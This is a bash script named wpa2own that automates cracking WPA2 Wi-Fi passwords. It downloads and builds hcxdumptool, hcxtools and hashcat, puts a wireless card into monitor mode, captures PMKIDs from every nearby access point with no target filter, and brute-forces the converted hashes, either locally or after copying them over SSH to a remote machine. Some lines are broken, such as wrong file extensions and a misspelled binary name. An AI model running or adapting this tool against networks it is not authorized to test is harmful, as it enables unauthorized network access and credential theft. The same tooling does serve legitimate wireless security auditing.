#!/bin/bash

set -e

####
####   wpa2own   (crack WPA2 pre-shared keys) 
####
#### For details, usage, gotchas, and license
#### see https://github.com/philcryer/wpa2own
####

####
#### Variables
####
# Run hashcat to crack passwords remotely?
# TODO get local, CPU hashing working
#remote_hashing="no"
remote_hashing="yes"

# If "yes" set the following remote variables
#remote_host="host.name.com"
#remote_user="luser"
#remote_port="22"
remote_host="192.168.1.5"
remote_user="phil"
remote_port="22"

# Maximum package capture file size in megabytes
pcap_max_size="10"

# no need to modify the following variables
timestamp=$(date +%s)
this_arch=$(arch)
this_uname=$(uname)

####
#### Functions
####
function rainbowsh(){
	#  Copyright 2013 Manuel Gutierrez <dhunterkde@gmail.com>
	#  https://github.com/xr09/rainbow.sh
	#  Bash helper functions to put colors on your scripts
	#
	#  Usage example:
	#  vargreen=$(echogreen "Grass is green")
	#  echo "Coming next: $vargreen"
	#
	__RAINBOWPALETTE="1"
	function __colortext()
	{
  	  echo -e " \e[$__RAINBOWPALETTE;$2m$1\e[0m"
	}
	function echogreen()
	{
	  echo $(__colortext "$1" "32")
	}
	function echored()
	{
  	  echo $(__colortext "$1" "31")
	}
	function echoblue()
	{
  	  echo $(__colortext "$1" "34")
	}
	function echopurple()
	{
  	  echo $(__colortext "$1" "35")
	}
	function echoyellow()
	{
	  echo $(__colortext "$1" "33")
	}
	function echocyan()
	{
	  echo $(__colortext "$1" "36")
	}
}

function rainbowsh_prompt(){
	# A status prompt scheme I created using the above rainbowsh project
	prompt_open=$(echocyan "[")
	prompt_action=$(echopurple ">>>")
	prompt_info=$(echoyellow "---")
	prompt_close=$(echocyan "]")
	prompt_startstatus=$(echogreen "run")
	prompt_errorstatus=$(echored "!!!")
	prompt_endstatus=$(echogreen "end")
	prompt_okstatus=$(echogreen "ok")
        
	prompt_start="$prompt_open $prompt_startstatus $prompt_close"
	prompt_verb="$prompt_open $prompt_action $prompt_close"
	prompt_adj="$prompt_open $prompt_info $prompt_close"
	prompt_error="$prompt_open $prompt_errorstatus $prompt_close"
	prompt_end="$prompt_open $prompt_endstatus $prompt_close"
}

function wpa2own_logo(){
cat << "EOF"
                       ____
 __      ___ __   __ _|___ \ _____      ___ __
 \ \ /\ / | '_ \ / _` | __) / _ \ \ /\ / | '_ \ 
  \ V  V /| |_) | (_| |/ __| (_) \ V  V /| | | |
   \_/\_/ | .__/ \__,_|_____\___/ \_/\_/ |_| |_|
EOF
echo "   v`cat VERSION` |_| `shuf -n 1 txt/slogans`"
}

stage0_preflight(){
	echo -n "$prompt_adj" "  System: "
	if [ $this_uname != "Linux" ]; then
		echo "failed";echo "$prompt_error" "  Error: this script only supports Linux"
		echo "$prompt_end"
		exit 1
	else
		echo "$this_uname $prompt_okstatus"
	fi
	echo -n "$prompt_adj" "  Arch: "
	if [ $this_arch != "x86_64" ]; then
		echo "failed";echo "$prompt_error" "  Error: this script only supports a 64bit (x86_64) architecture"
		echo "$prompt_end"
		exit 1
	else
		echo "$this_arch $prompt_okstatus"
	fi
    for cli in git curl make bash sudo rsync shuf; do
	if type "$cli" > /dev/null 2>&1; then
		echo -n "$prompt_adj" "  Apps: $cli "
		echo "$prompt_okstatus"
	fi	
        if ! type "$cli" > /dev/null 2>&1; then
	    echo "failed";echo "$prompt_error" "  Error: $cli not installed or in the PATH. Aborting." 
            exit 1
        fi
    done
}

function stage1-config(){
	echo -n "$prompt_adj" "  Directory: bin "
	if [ ! -d "bin" ]; then mkdir bin; fi
	echo "$prompt_okstatus"
	echo -n "$prompt_adj" "  Directory: out "
	if [ ! -d "out" ]; then mkdir out; fi
	echo "$prompt_okstatus "
	echo -n "$prompt_adj" "  Directory: src "
	if [ ! -d "src" ]; then mkdir src; fi
	echo "$prompt_okstatus"

	echo -n "$prompt_adj" "  Software: hcxdumptool "
	if [ ! -f "bin/hcxdumptool" ]; then
		echo
		cd src
		curl -s -L https://github.com/ZerBea/hcxdumptool/archive/4.2.1.tar.gz | tar zx 
		cd hcxdumptool-*
		make
		mv hcxdumptool ../../bin/
		cd ../..
        else
		echo "$prompt_okstatus"
	fi

	if [ ! -f "bin/hashcat-legacy" ]; then
	    echo "$prompt_adj" "  Software: hashcat-legacy"
		cd src
		if [ ! -d "hashcat-legacy" ]; then
			git clone https://github.com/hashcat/hashcat-legacy.git
		fi
		cd hashcat-legacy
		#sudo ./tools/deps.sh
		make linux64
		mv hashcat-cli64.bin ../../bin/hashcat-legacy
		cd ../..
	fi

	echo -n "$prompt_adj" "  Software: hashcat "
	if [ ! -f "bin/hashcat" ]; then
		echo
		cd src
		if [ ! -d "hashcat" ]; then
			git clone https://github.com/hashcat/hashcat.git
		fi
		cd hashcat
		git submodule update --init
        cp -R OpenCL ../../bin/
		make
		cp hashcat* ../../bin/
		cd ../..
		echo "$prompt_okstatus"
    else
		echo "$prompt_okstatus"
	fi

	echo -n "$prompt_adj" "  Software: hcxpcaptool "
	if [ ! -f "bin/hcxpcaptool" ]; then
		echo
		cd src
		curl -s -L https://github.com/ZerBea/hcxtools/archive/4.2.1.tar.gz | tar zx 
		cd hcxtools-*
		make
 		mv hcxpcaptool hcxhashcattool wlanhc2hcx wlanwkp2hcx wlanhcxinfo wlanhcx2cap wlanhcx2essid wlanhcx2ssid wlanhcxmnc wlanhashhcx wlanhcxcat wlanpmk2hcx wlanjohn2hcx wlancow2hcxpmk whoismac wlanhcx2john wlanhcx2psk wlancap2wpasec ../../bin
		cd ../..
        else
		echo "$prompt_okstatus"
	fi
	echo -n "$prompt_adj" "  Software: making binaries executable "
	chmod a+x bin/*
	echo "$prompt_okstatus"
}

function stage2-capture(){
	# this will guess a network interface to use
	# TODO maybe use iwconfig to guess wireless nic?
	my_interface=$(./bin/hcxdumptool -I | tail -n1 | cut -d" " -f2)
	# NOTE if this fails, you might have to hardcode this like:
	#my_interface="wlan1"
	# but remember; it has to support monitor mode, else you will fail!

	# Turn on monitor mode, for the last time - your nic must support monitor mode!
	sudo ip link set $my_interface down
	sudo iw dev $my_interface set type monitor
	#sudo rfkill unblock all
	sudo ip link set $my_interface up

	echo "$prompt_adj" "  Hcxdumptool: running capture on interface $my_interface"
	echo "$prompt_adj" "  Hcxdumptool: run this for ~10 minutes, looking for the message:"
	echo "$prompt_adj" "  Hcxdumptool: [FOUND PMKID] then hit control-c to stop and continue"
	# TODO create filterlist if APs if we don't want to hack some? So like a whitelist, but is this needed even?
	#sudo ./hcxdumptool -o new.pcapng -i $my_interface --enable_status=1 --filtermode=2 --filterlist=filter.txt
	# run hcxdumptool to capture traffic, build a pcap
	cd out; sudo ../bin/hcxdumptool -o $timestamp.pcapng -i $my_interface --enable_status=1

    # Turn of capture interface
	sudo ip link set $my_interface down

	# TODO have it create more output (needs testing)
	echo "$prompt_adj" "  Hcxpcaptool: converting frame to has for hashcat"
	../bin/hcxpcaptool -E essidlist -I identitylist -U usernamelist -z $timestamp.16800 $timestamp.pcapng
}

function stage3-crack(){
    if [ "$remote_hashing" == "no" ]; then
	    echo "$prompt_adj" "  Cracking: running hashcat against $timestamp.pcapng"
        #./bin/hashcat-legacay -m 16800 out/$timestamp.168000 -a 3 -w 3 '?l?l?l?l?l?lt!''
        ./bin/hashcat-legacy out/1534471605.16800
        exit 0
    fi

    if [ "$remote_hashing" == "yes" ]; then
	    echo -n "$prompt_adj" "  Transferring: files to remote host for hashing "
 	    rsync -q -avz -e "ssh -p $remote_port" ./ $remote_user@$remote_host:$HOME/wpa2own
		echo "$prompt_okstatus"

        # TODO build hashcat binary on remote node? (may need some build pkgs from apt-get in README.md, but could be faster if optimized there?)
        #ssh -p $remote_port $remote_user@$remote_host -C 'cd $HOME/wpa2own/src/hashcat; make; chmod 755 hashcat*; mv hashcat* $HOME/wpa2own/bin'

	    echo -n "$prompt_adj" "  Hashing: running hashcat on remote server "
		echo "$prompt_okstatus"
        ssh -p $remote_port $remote_user@$remote_host -C 'cd $HOME/wpa2own; ./bin/hashcat -m 16800 out/$timestamp.168000 -a 3 -w 3 '?l?l?l?l?l?lt!''
    fi
}

####
#### Program
####
clear; rainbowsh; rainbowsh_prompt; wpa2own_logo 
echo;echo "$prompt_start"

echo "$prompt_verb" "Stage 0 - Preflight"
stage0_preflight

echo "$prompt_verb" "Stage 1 - Config"
stage1-config

echo "$prompt_verb" "Stage 2 - Capture"
stage2-capture

echo "$prompt_verb" "Stage 3 - Crack"
stage3-crack

echo "$prompt_end"

exit 0
